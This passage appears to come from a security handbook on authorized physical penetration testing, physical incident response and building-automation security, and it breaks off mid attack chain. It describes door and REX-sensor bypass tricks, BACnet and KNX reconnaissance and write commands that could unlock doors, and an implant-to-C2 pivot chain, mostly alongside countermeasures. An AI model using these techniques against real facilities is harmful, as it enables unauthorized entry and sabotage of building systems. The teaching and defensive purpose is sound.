| **Satellite/aerial imagery** | Google Earth (historical imagery), Bing Maps 3D, county GIS portals | Building footprint, roof access, perimeter fencing, gate locations, parking layout, HVAC placement, loading docks |
| **Street-level observation** | On-foot survey, dashcam recording from vehicle | Camera placement and models, reader type and mounting height, lock hardware brands, guard patrol patterns, badge visibility on employees |
| **Public records** | County building permits, fire department inspection reports, FCC antenna registrations | Floor plans (sometimes full architectural drawings in permit filings), fire exit locations, wireless equipment deployment |
| **Social media / OSINT** | LinkedIn (employee badge photos), Instagram/TikTok (office interior photos), Glassdoor (office descriptions) | Badge design/technology, interior layout, security desk location, employee dress code, visitor procedures |
| **Job postings** | Company career pages, LinkedIn jobs | Security technology stack (mentions of specific PACS, VMS, or alarm vendors), staffing levels, shift patterns |
| **Wireless reconnaissance** | Laptop with external antenna + Kismet/Wigle | SSID enumeration, wireless network boundaries, potential rogue AP placement opportunities |

**Active reconnaissance (during authorized window):**

- Walk the perimeter during business hours as a pedestrian. Note camera blind spots, reader locations, door propping, tailgating opportunity points.
- Visit the building lobby as a "visitor" (if in-scope) to observe visitor sign-in procedures, badge issuance, escort policies.
- Photograph (from public areas) lock hardware, reader models, intercom systems, and signage that reveals security procedures.
- Map guard patrol timing and routes across multiple observation sessions. Three independent sessions over different days/times is the minimum for reliable pattern identification.

### 19J.3 Entry Techniques

Entry techniques are executed during the authorized window using permitted methods per the RoE. Each attempt is timestamped and documented in real-time.

**Technique selection matrix:**

| Technique | Skill Required | Detection Risk | Stealth | Prerequisites |
|-----------|---------------|----------------|---------|---------------|
| **Tailgating** (follow authorized person through controlled door) | Low | Medium | High | Business attire, confidence, timing |
| **Social engineering** (ask to be let in, pose as vendor/delivery) | Medium | Low | High | Pretext development, props (uniform, clipboard, delivery box) |
| **Badge cloning** (clone captured RFID credential) | High | Low | High | Proxmark3/Flipper Zero, captured credential (see §4 for technique) |
| **Lock bypass** (pick, bump, bypass) | High | Medium | Medium | Lockpick set, practice on target lock type (see §2) |
| **Door hardware bypass** (under-door tool, latch slip, REX sensor trigger) | Medium | Low | High | Under-door tool, shove knife, access to REX sensor gap |
| **After-hours access** (enter during low-staffing periods) | Low | Low (if no monitoring) | High | Knowledge of staffing schedule, entry technique for locked doors |

**Under-door tool bypass:**

Many commercial doors have a gap between the door bottom and the frame sufficient to slide a flexible tool underneath. If the interior has a push-bar (panic hardware) or lever handle, the tool hooks or presses the hardware from below. This bypasses the lock entirely.

```
Attack requirements:
- Door gap > 3mm at bottom
- Interior hardware: push bar, paddle handle, or lever
- Tool: commercial under-door tool (UDT) or rigid wire with hook

Countermeasures:
- Door sweeps / bottom seals (reduce gap below 3mm)
- Door-bottom astragal
- Interior handle guard (shroud around lever/paddle)
- Dual-authentication vestibule (mantrap) for critical areas
```

**Request-to-exit (REX) sensor exploitation:**

Many doors use passive infrared (PIR) motion sensors on the secure side to allow egress without badging. Some PIR sensors are mounted in positions where they can be triggered from the unsecured side.

```
Attack vectors:
- Slide paper/card under door to trigger floor-level PIR
- Use compressed air (canned air duster) sprayed through door gap
  to create thermal differential triggering PIR
- If REX sensor is visible through glass, use IR emitter to trigger

Countermeasures:
- Replace PIR REX sensors with push-to-exit buttons on critical doors
- Mount PIR sensors higher and angled away from door gap
- Use dual-technology REX (PIR + microwave) requiring both triggers
```

### 19J.4 Internal Objectives

Once inside, the tester executes pre-agreed objectives that demonstrate the business impact of a physical breach. All objectives must be documented in the RoE.

**Common internal objectives and evidence markers:**

| Objective | Evidence Marker | Business Impact Demonstrated |
|-----------|----------------|------------------------------|
| **Server room access** | Photograph of tester inside server room with timestamp card visible | Physical access to core infrastructure — full network compromise path |
| **Network implant deployment** | Photograph of implant device installed (use inert marker device, not live implant, unless RoE explicitly permits) | Persistent network access from physical breach |
| **Sensitive document access** | Photograph of document/whiteboard content visible from accessible areas (do NOT photograph actual sensitive content if RoE restricts) | Information leakage from inadequate clean-desk policy |
| **Workstation access** | Photograph of unlocked workstation with tester's USB device inserted (proof of access, not data extraction) | Endpoint compromise path, DMA attack, USB attack vector |
| **Badge escalation** | Clone low-privilege badge, use to access restricted area | Demonstrates credential hierarchy weakness |
| **Emergency exit exploitation** | Enter through emergency exit that does not alarm | Perimeter control failure, alarm system gap |

**Activity logging format:**

Every action during the internal phase is recorded in real-time:

```
[2025-09-15T14:23:07Z] ENTRY — Tailgated employee through Building A main entrance
[2025-09-15T14:25:41Z] MOVEMENT — Accessed stairwell B, ascended to floor 3
[2025-09-15T14:27:12Z] OBSERVATION — Server room door (Room 302) secured with HID iCLASS reader + PIN pad
[2025-09-15T14:28:55Z] ATTEMPT — Presented cloned badge at Room 302 reader — ACCESS DENIED (PIN required)
[2025-09-15T14:31:18Z] MOVEMENT — Proceeded to IDF closet (Room 318), tested door — UNLOCKED
[2025-09-15T14:31:45Z] OBJECTIVE — Photographed IDF closet interior (network switches, patch panels, no lock on switch rack)
[2025-09-15T14:32:30Z] OBJECTIVE — Placed inert marker device on switch rack shelf (simulated implant)
[2025-09-15T14:35:00Z] EXIT — Departed via stairwell A, exited Building A through parking garage
```

### 19J.5 Documentation and Reporting

Physical pentest documentation differs from network pentest reports in its emphasis on photographic evidence, timestamped narratives, and physical remediation recommendations.

**Finding severity rating matrix for physical security:**

| Severity | Criteria | Example | Remediation Timeline |
|----------|----------|---------|---------------------|
| **CRITICAL** | Undetected access to critical infrastructure (server room, vault, ICS/SCADA) with no compensating controls | Server room accessible via unlocked IDF closet and shared ceiling plenum | 30 days |
| **HIGH** | Undetected perimeter breach or access to sensitive areas with weak compensating controls | Tailgating through main entrance with no guard challenge, no turnstile, no mantrap | 60 days |
| **MEDIUM** | Access control weakness that requires additional exploitation to reach critical areas | Badge clonable (MIFARE Classic) but critical doors require PIN + badge | 90 days |
| **LOW** | Minor security hygiene issue or policy violation without direct exploitation path | Clean-desk violations, badges worn on belt (not visible for cloning but policy non-compliance) | 120 days |
| **INFORMATIONAL** | Observation or recommendation not tied to a specific vulnerability | Lobby security desk has poor sightline to east entrance | Next budget cycle |

**Report structure:**

```
1. Executive Summary
   - Scope and objectives
   - Overall security posture assessment (one paragraph)
   - Critical/high findings count
   - Top 3 recommendations

2. Methodology
   - Reconnaissance techniques used
   - Entry methods attempted (successful and failed)
   - Internal objectives attempted (completed and blocked)

3. Findings (per finding)
   - Title
   - Severity (CRITICAL/HIGH/MEDIUM/LOW/INFO)
   - Location (building, floor, room, door ID)
   - Description (narrative with timestamps)
   - Evidence (photographs, video stills — redacted per RoE)
   - Business impact
   - Remediation recommendation (specific, actionable)
   - Remediation cost estimate (if requested)

4. Positive Observations
   - Controls that successfully blocked or detected the tester

5. Appendices
   - Full timestamped activity log
   - RoE and authorization letter (redacted)
   - Tool list
   - Photographic evidence index
```

---

## 19K. Physical Security Incident Response

Physical security incidents — unauthorized facility access, discovered implant devices, insider threat indicators, or tampering evidence — require response procedures distinct from purely digital incidents. Evidence is perishable (a propped door can be closed, a device can be removed), and coordination with facilities, legal, and potentially law enforcement adds complexity not present in network incident response.

### 19K.1 Intrusion Detection Response Procedures

When a physical intrusion is detected (alarm, camera alert, guard observation, or SIEM correlation), the response follows a structured sequence that prioritizes human safety, evidence preservation, and containment.

**Physical intrusion response procedure:**

| Step | Action | Responsible Party | Time Target |
|------|--------|-------------------|-------------|
| 1 | **Safety assessment** — Determine if the intrusion presents a safety threat to personnel. If armed intruder or violence risk, initiate lockdown and call law enforcement immediately. | Security Operations Center (SOC) | Immediate |
| 2 | **Alert dispatch** — Notify on-site security team with location, nature of alert, and camera feed link. | SOC | < 2 minutes |
| 3 | **Visual confirmation** — SOC reviews live camera feeds for the affected zone. Confirm or rule out false positive. | SOC analyst | < 5 minutes |
| 4 | **Guard dispatch** — Send security officer to the location. Officer carries radio, body camera (if policy permits), and incident report form. | SOC → Security officer | < 10 minutes |
| 5 | **Containment** — If intruder located: challenge and escort. If intruder not located: lock down affected zone, prevent exit until sweep complete. | Security officer | Situational |
| 6 | **Evidence preservation** — Secure camera footage (export and hash), preserve badge logs, photograph scene before any changes. | SOC + Security officer | < 30 minutes |
| 7 | **Scope assessment** — Determine what the intruder could have accessed. Review all badge events, camera footage, and door status for the affected zone ±2 hours. | SOC + IT security | < 2 hours |
| 8 | **Sweep for implants** — Physical inspection of the affected zone for planted devices (see §19K.3 for sweep procedure). | IT security + Facilities | < 4 hours |
| 9 | **Notification** — Notify CISO, legal, and management per incident severity matrix. If data exposure possible, engage privacy officer. | Incident commander | Per severity |
| 10 | **Report** — Complete incident report with timestamped narrative, evidence index, and remediation actions. | Incident commander | < 24 hours |

### 19K.2 Evidence Preservation for Physical Security Incidents

Physical evidence degrades or disappears rapidly. Evidence preservation must begin during the response, not after.

**Chain of custody form fields:**

```
PHYSICAL SECURITY INCIDENT — CHAIN OF CUSTODY

Incident ID: _______________
Date/Time of Collection: _________________ (UTC ISO 8601)
Collected By: _______________
Witness: _______________

Evidence Item #: _______________
Description: _______________
Location Found: _______________  (building/floor/room/specific location)
Condition at Collection: _______________
Photograph Reference: _______________  (photo filename/number)

SHA-256 Hash (if digital media): _______________

Custody Transfer Log:
| Date/Time (UTC) | From | To | Purpose | Signature |
|-----------------|------|-----|---------|-----------|
|                 |      |     |         |           |
```

**Evidence types and preservation requirements:**

| Evidence Type | Preservation Method | Integrity Control | Retention |
|--------------|--------------------|--------------------|-----------|
| **Camera footage** | Export from VMS as native format (not re-encoded). Copy to write-once media (WORM). | SHA-256 hash at export time, recorded in chain-of-custody. | Minimum 90 days; 1 year if litigation anticipated |
| **Badge access logs** | Export from PACS as CSV/XML. Print and sign hard copy as backup. | Hash exported file. Cross-reference with SIEM copy for integrity. | Minimum 90 days |
| **Physical device** (implant, tool left behind) | Do not power on. Place in anti-static bag. Photograph in-situ before moving. Label with evidence tag. | Chain of custody from discovery to forensic lab. Photograph tag + device at each transfer. | Until investigation closes |
| **Photographs** | High-resolution, timestamped (camera clock synced to NTP). Include scale reference (ruler) and evidence marker in frame. | Hash original files. Store originals separately from working copies. | Minimum 1 year |
| **Door/lock condition** | Photograph lock, latch, strike plate, hinges. Note whether door was locked/unlocked/forced. Do not re-lock before photographing. | Documented in incident report with photo reference. | Report retention period |
| **Environmental data** | Export temperature, humidity, power logs from BMS for ±24 hours around incident. | Hash exported files. | 90 days |

### 19K.3 Implant Sweep Procedure

After any suspected physical intrusion, a sweep for implanted devices is mandatory. Implants include network taps, rogue APs, hardware keyloggers, cellular exfiltration devices, and audio/video surveillance devices.

**Network implant sweep:**

```bash
# Step 1: Scan for unexpected devices on all VLANs in the affected zone
# Compare against known-good asset inventory
nmap -sn 10.10.0.0/24 -oG - | grep "Status: Up" | awk '{print $2}' | \
  sort > /tmp/current_hosts.txt
comm -13 /etc/nmap/known_hosts_vlan10.txt /tmp/current_hosts.txt

# Step 2: Identify unknown MAC addresses (possible implant)
nmap -sn 10.10.0.0/24 -oX /tmp/scan.xml
python3 -c "
import xml.etree.ElementTree as ET
tree = ET.parse('/tmp/scan.xml')
known_oui = set(open('/etc/nmap/known_oui.txt').read().split())
for host in tree.findall('.//host'):
    addr = host.find('address[@addrtype=\"ipv4\"]')
    mac = host.find('address[@addrtype=\"mac\"]')
    if mac is not None and addr is not None:
        oui = mac.get('addr')[:8].upper()
        if oui not in known_oui:
            print(f'UNKNOWN: IP={addr.get(\"addr\")} MAC={mac.get(\"addr\")} '
                  f'Vendor={mac.get(\"vendor\",\"unknown\")}')
"

# Step 3: Check for rogue wireless in the affected zone
iw dev wlan0 scan | grep -E "^BSS|SSID:|signal:" | \
  paste - - - | sort -t: -k3 -rn

# Step 4: Scan for Bluetooth/BLE implants (cellular exfiltration, BLE beacons)
hcitool lescan --duplicates 2>/dev/null &
sleep 30 && kill %1
# Review output for unknown BLE devices in proximity
```

**Physical inspection checklist:**

| Location | What to Check | Implant Indicators |
|----------|--------------|-------------------|
| **Network closets / IDF** | Every port on every switch. Trace each cable to its endpoint. | Unknown devices on switch ports, cables running to concealed locations, devices zip-tied or taped to cable bundles |
| **Underfloor / above ceiling** | Lift tiles, inspect cable trays | Devices attached to power or network cabling in concealed spaces |
| **Workstations** | Inspect USB ports (front and rear), keyboard/mouse cables | Inline USB devices (keyloggers), replaced keyboards, unknown USB devices |
| **Conference rooms** | Under tables, inside phone/AV equipment, power strips | Audio recording devices, rogue APs disguised as chargers |
| **Telephone / VoIP systems** | Inspect handset cord, base unit, wall jack | Inline recording devices, modified handsets |
| **Printers / copiers** | USB ports, network port, internal storage | Network implants on printer Ethernet ports, modified firmware indicators (compare firmware hash) |
| **Access control hardware** | Reader wiring, controller panel | ESPKey or BLEKey inline on Wiegand cabling (see §4), modified reader firmware |

### 19K.4 Insider Threat Physical Indicators

Physical security systems generate behavioral signals that complement digital insider threat programs. The following indicators, individually benign, become significant when clustered.

**Physical insider threat indicator checklist:**

| Indicator Category | Specific Behavior | Detection Method | Risk Weight |
|-------------------|-------------------|-----------------|-------------|
| **Access pattern changes** | Accessing areas outside normal job function | PACS log analysis, behavioral analytics (§19I.8) | Medium |
| **After-hours presence** | Repeated after-hours facility access without business justification | After-hours detection rule (§19I.2) | Medium |
| **Bulk material removal** | Large bags, boxes, or containers leaving the facility during unusual hours | Camera analytics, guard observation | High |
| **Photography / recording** | Photographing screens, whiteboards, documents, or security controls | Camera analytics, coworker reporting | High |
| **Circumventing controls** | Propping doors, disabling cameras, avoiding badge-in at specific doors | Door-held alarms, camera tamper alerts, APB violations | High |
| **Tailgate facilitation** | Holding doors for unknown individuals, not challenging unbadged visitors | Guard observation, anti-passback analysis | Medium |
| **Unusual printing** | Large print jobs, especially outside business hours or from restricted data sources | Print server logs correlated with PACS data | Medium |
| **Badge lending** | Lending badge to another individual | APB violations (badge in two zones simultaneously), velocity anomaly | Critical |
| **Reconnaissance behavior** | Systematically testing doors, reading security signage, photographing lock hardware | Camera analytics with behavioral AI, guard reporting | High |

When three or more indicators from different categories cluster around the same individual within a 30-day window, escalate to the insider threat working group per organizational policy.

### 19K.5 Post-Incident Facility Security Assessment

After containment and evidence preservation, a structured security assessment identifies how the incident occurred and what controls failed.

**Assessment framework:**

```
1. ENTRY VECTOR ANALYSIS
   - How did the intruder gain initial access?
   - Which control failed or was bypassed?
   - Was the failure a technology gap, configuration error, or human factor?
   - Review: perimeter cameras, badge logs, guard logs, visitor logs,
     door-position sensors for the 48 hours before detection

2. LATERAL MOVEMENT ANALYSIS
   - Once inside, what areas did the intruder access?
   - Were zone boundaries (mantraps, secondary badge points) effective?
   - Were any doors propped, held, or bypassed?
   - Review: all badge events, camera footage along movement path,
     door-held/forced-open alarms

3. DETECTION TIMELINE
   - When did the intrusion occur vs. when was it detected?
   - What system generated the first alert?
   - Was the alert acted upon promptly?
   - Mean-time-to-detect (MTTD) and mean-time-to-respond (MTTR)

4. CONTROL EFFECTIVENESS SCORING
   | Control | Expected Behavior | Actual Behavior | Score |
   |---------|------------------|-----------------|-------|
   | Perimeter door locks | Prevent unauthorized entry | [finding] | 0-5 |
   | Badge authentication | Accept only valid credentials | [finding] | 0-5 |
   | Anti-passback | Detect tailgating | [finding] | 0-5 |
   | Camera coverage | Record all entry points | [finding] | 0-5 |
   | Guard response | Challenge unauthorized individuals | [finding] | 0-5 |

5. REMEDIATION PLAN
   - Immediate actions (< 72 hours): lock replacement, badge revocation,
     sweep completion
   - Short-term (< 30 days): control upgrades for the specific failure
   - Long-term (< 90 days): systemic improvements, policy updates,
     training programs
```

### 19K.6 Coordination with Law Enforcement

Physical security incidents may require law enforcement involvement. The decision and process must be pre-established, not improvised during an incident.

**Law enforcement engagement criteria:**

| Condition | Action |
|-----------|--------|
| Active threat to human safety | Call emergency services (911/112/999) immediately — no further approval needed |
| Property crime (break-in, theft, vandalism) | Engage law enforcement per organizational policy; typically requires management/legal approval |
| Suspected espionage (state-sponsored, competitive) | Engage legal counsel first; law enforcement contact through counsel. In US: FBI field office. In EU: national security service. |
| Discovered surveillance device | Engage legal counsel; potentially counter-intelligence if government facility |
| Evidence of employee criminal activity | Engage legal counsel and HR first; law enforcement through counsel if prosecution desired |

**When law enforcement is engaged:**

- Assign a single point-of-contact (liaison) for all law enforcement interactions.
- Provide copies (not originals) of evidence. Originals remain in organizational custody unless subpoenaed.
- Document every interaction: date/time (UTC), officer name/badge, information shared, information requested.
- Do not share network/IT forensic data without legal counsel review — scope creep from physical to digital evidence has compliance implications (privacy, privilege).
- Preserve the scene as-is until law enforcement has had opportunity to process it, unless safety requires otherwise.

### 19K.7 Recovery Procedures

Recovery restores the facility to a trusted security state after the incident is contained and evidence preserved.

**Recovery action checklist:**

| Action | Condition Triggering Action | Responsible Party |
|--------|---------------------------|-------------------|
| **Lock re-key or replacement** | Lock was picked, bumped, bypassed, or key was lost/stolen | Facilities / Locksmith |
| **Badge revocation and reissuance** | Badge was cloned, stolen, or used by unauthorized person | PACS administrator |
| **Reader replacement** | Reader was tampered with or implant (ESPKey/BLEKey) was discovered on reader wiring | Physical security integrator |
| **Camera repositioning** | Camera blind spot exploited during incident | Physical security integrator |
| **Network port remediation** | Implant device found on network port; disable port, re-authenticate via 802.1X, re-scan segment | Network operations |
| **Firmware verification** | Implant involved firmware modification (access control panel, camera, network device) | IT security + vendor |
| **Wireless environment re-baseline** | Rogue AP discovered; full wireless scan to establish new known-good baseline | IT security |
| **Security awareness refresh** | Social engineering was the entry vector | Security training team |
| **Guard procedure update** | Guard response was ineffective or procedural gap identified | Security management |

---

## 19L. Emerging Physical Security Technologies

Physical security is converging with AI, biometrics, autonomous systems, and building automation — expanding both defensive capability and attack surface. This section covers emerging technologies, their security implications, and the new threat vectors they introduce.

### 19L.1 AI-Powered Video Analytics

AI video analytics transforms passive camera systems into active detection platforms. Modern implementations run inference at the edge (on NVR or dedicated GPU appliance) or in the cloud, analyzing video streams in real-time.

**Capability matrix:**

| Capability | Technology | Vendors (Examples) | Accuracy (Typical) | Privacy Implications |
|-----------|-----------|-------------------|--------------------|--------------------|
| **Behavioral anomaly** | CNN + LSTM sequence analysis | BriefCam, Avigilon Appearance Search, Genetec KiwiVision | 85-92% anomaly detection; 15-25% false positive rate | Low — detects behavior, not identity |
| **Weapon detection** | Object detection (YOLO/EfficientDet fine-tuned) | ZeroEyes, Omnilert, Evolv Express | 90-95% for visible firearms; lower for concealed | Low — object classification, no PII |
| **Crowd density** | Head-count estimation via density map | HIVE Analytics, Genetec | ±10% accuracy at high density | Low — aggregate count, no individual tracking |
| **Facial recognition** | Embedding extraction + vector similarity | Clearview (LE), NEC NeoFace, Dahua | 99.5%+ on controlled enrollment; significantly lower in wild conditions | Critical — biometric PII, regulated in many jurisdictions |
| **License plate recognition** | OCR + vehicle type classification | Genetec AutoVu, Vigilant Solutions | 98%+ in controlled lighting; drops with angle/weather | Medium — vehicle tracking, some jurisdictions restrict |
| **Perimeter intrusion** | Motion segmentation + object classification | Bosch IVA, Axis ACAP, Hikvision Smart | 80-90%; high false positive from animals/weather | Low — zone-based alerting |

**Security concerns with AI video analytics:**

- **Adversarial evasion:** Adversarial patches (physical stickers or clothing patterns) can cause misclassification in object detection models. Research has demonstrated patches that prevent person detection by YOLO-family models. Mitigation: multi-model ensembles, regular model retraining against adversarial datasets.
- **Model poisoning:** If the analytics system includes on-premise retraining from local data, an attacker with physical access could introduce poisoned training samples. Mitigation: training data integrity controls, model performance monitoring.
- **Privacy and legal compliance:** Facial recognition is banned or restricted for public surveillance in several US cities (San Francisco, Portland, Boston), the EU AI Act classifies real-time biometric identification in public spaces as high-risk/prohibited (with exceptions for law enforcement). Deployment must be jurisdiction-aware.

### 19L.2 Biometric Access Evolution

Traditional badge-based access is a single-factor "something you have" that can be cloned (§4). Biometrics add "something you are," but each modality carries distinct security and usability tradeoffs.

**Biometric modality comparison:**

| Modality | FAR (False Accept) | FRR (False Reject) | Spoofability | Liveness Detection | Throughput | Deployment Maturity |
|----------|-------------------|--------------------|-------------|-------------------|------------|-------------------|
| **Fingerprint** | 0.001% | 1-3% | Medium (gelatin/silicone molds, printed conductive ink) | Capacitive + pulse detection | High (< 1s) | Mature |
| **Iris scan** | 0.0001% | 0.5-2% | Low (high-resolution iris photos can fool some sensors) | NIR pupil dilation response | Medium (2-3s) | Mature |
| **Palm vein** | 0.00008% | 0.01% | Very low (requires subcutaneous vascular pattern, extremely difficult to replicate) | Inherent — scans subcutaneous vasculature | Medium (1-2s) | Growing (Fujitsu PalmSecure) |
| **Facial recognition** | 0.1-1% (uncontrolled) | 2-5% | High (2D photos, 3D masks, deepfake video) | 3D depth mapping + IR liveness | High (< 1s, contactless) | Mature for controlled enrollment; problematic in wild |
| **Gait recognition** | 1-5% | 5-10% | Low (gait is difficult to consciously replicate) | Inherent — continuous behavioral biometric | High (passive, no stop required) | Emerging (Watrix, research stage) |
| **Voice recognition** | 0.5-2% | 3-5% | High (voice cloning, replay attacks) | Challenge-response, spectral analysis | Medium | Mature for logical access; rare for physical |
| **Behavioral (typing/mouse dynamics)** | 2-5% | 5-10% | Low (requires sustained mimicry) | Inherent — continuous | High (passive) | Emerging — logical access only |

**Palm vein as next-generation physical access credential:**

Palm vein scanning (Fujitsu PalmSecure, Amazon One) uses near-infrared light to image the subcutaneous vascular pattern. The pattern is unique per individual (even identical twins differ) and impossible to capture at distance (unlike fingerprints or facial features). Implementation considerations:

- Enroll both hands (primary + backup if injured).
- Pair with PIN for two-factor (biometric + knowledge).
- Template storage: prefer on-card (DESFire EV3 with biometric template) over centralized database to limit breach impact.
- Environmental: works through thin gloves but not thick winter gloves; unaffected by skin surface condition (cuts, dirt, moisture).

**Continuous authentication for physical spaces:**

Emerging systems move beyond point-of-entry authentication to continuous presence verification:

- Gait recognition cameras in corridors verify that the person walking matches the identity that badged in.
- UWB (ultra-wideband) badges continuously verify badge proximity to the holder (anti-relay, anti-pass-back-by-distance).
- Multi-modal fusion: badge + face at door, gait in corridor, behavioral biometric at workstation — creating a continuous trust chain from perimeter to endpoint.

### 19L.3 Drone-Based Physical Security

Unmanned aerial systems (UAS/drones) serve both defensive and offensive roles in physical security.

**Defensive drone deployment:**

| Use Case | Platform Type | Operational Model | Limitations |
|----------|-------------|-------------------|-------------|
| **Perimeter patrol** | Fixed-wing or multirotor (DJI Matrice, Skydio X10) | Autonomous waypoint patrol with RTH (return-to-home) on low battery | Regulatory (FAA Part 107 BVLOS waiver required in US), weather dependency |
| **Alarm response** | Tethered drone (Fotokite) or rapid-deploy indoor drone (Sunflower Labs) | Drone launches automatically on alarm trigger, flies to location, streams video to SOC | Indoor: GPS-denied navigation requires visual SLAM. Outdoor: wind, rain, night capability varies |
| **Asset inspection** | Multirotor with zoom/thermal camera | Scheduled infrastructure inspection (fenceline, rooftop, remote facilities) | Requires trained pilot or autonomous flight programming |

**Counter-drone (C-UAS) for facility defense:**

Unauthorized drones near sensitive facilities represent surveillance, payload delivery (contraband, explosives), and disruption threats.

| C-UAS Method | Technology | Effectiveness | Legal Constraints |
|-------------|-----------|--------------|-------------------|
| **RF detection** | Passive RF monitoring for drone control frequencies (2.4 GHz, 5.8 GHz, DJI OcuSync) | High for commercial drones; limited against autonomous/programmed-waypoint drones | Generally legal (passive monitoring) |
| **Radar detection** | Micro-doppler radar tuned for small UAS signatures | High; works against autonomous drones | Generally legal (passive sensing) |
| **Acoustic detection** | Microphone arrays with ML classification of rotor noise | Medium; limited range, high false positive in noisy environments | Generally legal |
| **RF jamming** | Broadband or protocol-specific RF jamming | High against RF-controlled drones | Illegal in most civilian jurisdictions (US: FCC, EU: national spectrum regulators). Authorized for military/federal facilities only. |
| **GPS spoofing** | Transmit false GPS signals to misdirect drone | Medium; ineffective against visual-navigation drones | Illegal in most jurisdictions |
| **Kinetic intercept** | Net-capture drones, trained birds of prey (historical), projectile systems | Variable; risk of collateral damage | Use-of-force considerations; liability for drone-fall damage |
| **Directed energy** | High-power microwave (HPM), laser | High effectiveness; long range | Military/government only; export controlled |

**Recommended approach for civilian facilities:** Layered detection (RF + radar + acoustic) with alert integration into SOC. Interdiction limited to geofencing requests to drone manufacturers (DJI Aeroscope → GEO Zone) and coordination with law enforcement for persistent threats.

### 19L.4 Smart Building Attack Surface

Modern buildings deploy building automation systems (BAS) for HVAC, lighting, access control, fire suppression, elevators, and energy management. These systems increasingly connect to IP networks, creating a physical-cyber convergence attack surface.

**Building automation protocol landscape:**

| Protocol | Layer | Typical Systems | Security Posture |
|----------|-------|----------------|-----------------|
| **BACnet (ASHRAE 135)** | Application (over IP, MS/TP, Ethernet) | HVAC, lighting, energy metering | Minimal authentication in base spec. BACnet/SC (Secure Connect) adds TLS but adoption is nascent (2024+). |
| **KNX** | Fieldbus (twisted pair, RF, IP) | Lighting, blinds, HVAC actuators | KNX IP has no encryption by default. KNX Secure (2019+) adds AES-128-CCM but requires explicit configuration and compatible devices. |
| **Modbus** | Serial (RTU) / TCP/IP | HVAC controllers, power meters, variable frequency drives | Zero authentication, zero encryption. Modbus TCP is cleartext on port 502. |
| **LonWorks (LON)** | Fieldbus / IP | Legacy HVAC, lighting, fire systems | No built-in security. Authentication added in LON/IP but rarely deployed. |
| **MQTT** | Message broker (over TCP/TLS) | Modern IoT sensors, occupancy, environmental | Supports TLS + username/password or certificate auth, but many deployments use anonymous access |

**BACnet reconnaissance and exploitation:**

```bash
# Discover BACnet devices on the network (BACnet/IP uses UDP 47808)
# Requires: pip install BAC0
python3 -c "
import BAC0
bacnet = BAC0.lite(ip='10.10.50.100/24')  # Attacker IP on BAS VLAN
# Who-Is broadcast discovers all BACnet devices
devices = bacnet.whois()
for d in devices:
    print(f'Device: {d}')
    # Read device object name and description
    try:
        name = bacnet.read(f'{d[0]} device {d[1]} objectName')
        desc = bacnet.read(f'{d[0]} device {d[1]} description')
        print(f'  Name: {name}  Desc: {desc}')
    except Exception as e:
        print(f'  Read error: {e}')
"

# Alternative: nmap BACnet discovery
nmap -sU -p 47808 --script bacnet-info 10.10.50.0/24
```

**KNX reconnaissance:**

```bash
# KNXmap — KNX/IP gateway scanner and device enumerator
# Install: pip install knxmap
knxmap scan 10.10.50.0/24 --bus-targets 1.1.0-1.1.255

# Enumerate group addresses (control channels for lights, HVAC, blinds)
knxmap groupwrite 10.10.50.1 --group-address 1/0/1 --value 1
# This command writes value 1 to group address 1/0/1
# In a real building, this might turn on lights, open a valve, or unlock a door
```

**Attack scenarios via building automation:**

| Attack Vector | Entry Point | Impact | Severity |
|--------------|-------------|--------|----------|
| **HVAC manipulation** | BACnet write to temperature setpoints | Server room overheating → thermal shutdown of IT equipment; occupant comfort disruption as cover for physical intrusion | HIGH |
| **Lighting control** | KNX group write to lighting circuits | Disable security lighting before physical entry; strobe lighting as disruption/distraction | MEDIUM |
| **Fire suppression manipulation** | BACnet/Modbus write to fire panel | False fire alarm → forced evacuation → uncontrolled facility access during evacuation; suppression system disablement | CRITICAL |
| **Access control via BAS** | BACnet integration with door controllers | Unlock doors via BAS network rather than PACS; bypass badge authentication entirely | CRITICAL |
| **Elevator control** | BACnet/Modbus to elevator controller | Trap occupants; provide floor access that should require badge; service disruption | HIGH |
| **Energy management** | Modbus write to power distribution | Selective power disruption to security systems (cameras, door controllers) | CRITICAL |

**Mitigation architecture for BAS security:**

```
                    ┌──────────────────────────────┐
                    │       CORPORATE IT NETWORK    │
                    │     (Standard segmentation)   │
                    └──────────────┬───────────────┘
                                   │
                         ┌─────────┴─────────┐
                         │    FIREWALL        │
                         │  (L3/L4 + DPI)     │
                         │  Default-deny      │
                         │  Allow only:       │
                         │  - BMS management  │
                         │    station → BAS   │
                         │  - SIEM collector   │
                         │    ← BAS syslog    │
                         └─────────┬─────────┘
                                   │
                    ┌──────────────┴───────────────┐
                    │     BAS / OT NETWORK         │
                    │  (Dedicated VLAN, no Internet │
                    │   egress, no user endpoints)  │
                    │                               │
                    │  ┌────────┐  ┌────────┐      │
                    │  │ BACnet │  │  KNX   │      │
                    │  │ devices│  │ devices │      │
                    │  └────────┘  └────────┘      │
                    │  ┌────────┐  ┌────────┐      │
                    │  │ Modbus │  │  MQTT   │      │
                    │  │ devices│  │ broker  │      │
                    │  └────────┘  └────────┘      │
                    └──────────────────────────────┘

Key controls:
1. Network segmentation: BAS on dedicated VLAN with no route
   to corporate or Internet without explicit firewall rule
2. BACnet/SC: Enable TLS on all BACnet/IP communication
   (requires BACnet/SC-capable controllers)
3. KNX Secure: Enable AES-128-CCM on KNX/IP backbone
4. Modbus: Isolate on dedicated serial or VLAN segment;
   no Modbus/TCP exposed to routable networks
5. MQTT: Enable TLS + client certificate auth; disable
   anonymous connections
6. Change default credentials on ALL BAS controllers,
   gateways, and management stations
7. Monitor BAS network with IDS tuned for ICS/BAS protocols
   (e.g., Claroty, Nozomi Networks, Dragos)
8. Physical access control on BAS network equipment
   (controllers, gateways, field panels) — locked cabinets
   with tamper detection
```

### 19L.5 Physical-Cyber Convergence Attack Chains

The most sophisticated physical security threats exploit the convergence of physical access, building automation, and IT/OT networks. An attacker who gains physical access can pivot to digital networks; conversely, a network attacker can manipulate physical systems.

**Attack chain: Physical entry → network compromise:**

```
1. PHYSICAL ENTRY
   Attacker tailgates through lobby (§5) or uses cloned badge (§4)
   ↓
2. LOCATE UNCONTROLLED NETWORK PORT
   Find unlocked IDF closet, unused wall jack, or printer with
   accessible Ethernet port
   ↓
3. DEPLOY NETWORK IMPLANT
   Connect LAN Turtle / Packet Squirrel / Raspberry Pi with
   cellular backhaul to the port (§8)
   ↓
4. ESTABLISH C2
   Implant phones home via cellular (bypasses all network egress
   controls) or bridges to attacker via reverse SSH tunnel
   ↓
5. NETWORK RECONNAISSANCE
   From implant: ARP scan, VLAN enumeration, service discovery.
   Identify BAS VLAN (BACnet on UDP 47808 is a beacon).
   ↓
6. PIVOT TO BAS
